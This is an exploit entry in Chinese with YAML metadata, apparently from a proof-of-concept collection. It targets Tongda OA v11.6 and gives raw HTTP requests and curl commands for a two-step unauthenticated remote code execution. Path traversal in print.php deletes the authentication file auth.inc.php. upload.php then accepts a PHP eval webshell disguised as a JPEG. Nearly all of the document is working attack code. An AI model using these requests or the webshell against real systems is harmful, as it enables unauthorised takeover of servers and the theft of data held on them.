---
id: TONGDA-V116-PRINT-DELETE-RCE
title: 通达OA v11.6 print.php 文件删除+未授权上传 RCE
product: tongda-oa
vendor: 北京通达信科
version_affected: "V11.6"
severity: CRITICAL
tags: [rce, file_delete, file_upload, 无需认证, 国产, oa]
fingerprint: ["通达OA", "Office Anywhere", "print.php"]
---

## 漏洞描述

通达OA v11.6 print.php 接口存在任意文件删除漏洞，攻击者先删除认证文件 auth.inc.php，再利用文件上传接口上传 webshell。

## 影响版本

- V11.6

## 前置条件

- 无需认证
- 目标为通达OA V11.6，`print.php` 和 `upload.php` 接口可访问

## 利用步骤

### Step 1: 删除认证文件

```http
GET /module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php HTTP/1.1
Host: target
```

### Step 2: 未认证上传 webshell（auth.inc.php 已删除）

```http
POST /ispirit/im/upload.php HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="UPLOAD_MODE"

2
------WebKitFormBoundary
Content-Disposition: form-data; name="P"

1
------WebKitFormBoundary
Content-Disposition: form-data; name="DEST_UID"

1
------WebKitFormBoundary
Content-Disposition: form-data; name="ATTACHMENT"; filename="shell.php"
Content-Type: image/jpeg

<?php @eval($_POST['cmd']);?>
------WebKitFormBoundary--
```

## Payload

### 删除认证文件

```bash
curl -s "http://target/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
```

### 上传 webshell

```bash
curl -s -X POST "http://target/ispirit/im/upload.php" \
  -F "UPLOAD_MODE=2" \
  -F "P=1" \
  -F "DEST_UID=1" \
  -F "ATTACHMENT=@shell.php;type=image/jpeg"
```

## 验证方法

上传成功后通过文件包含或直接访问 webshell 执行命令。
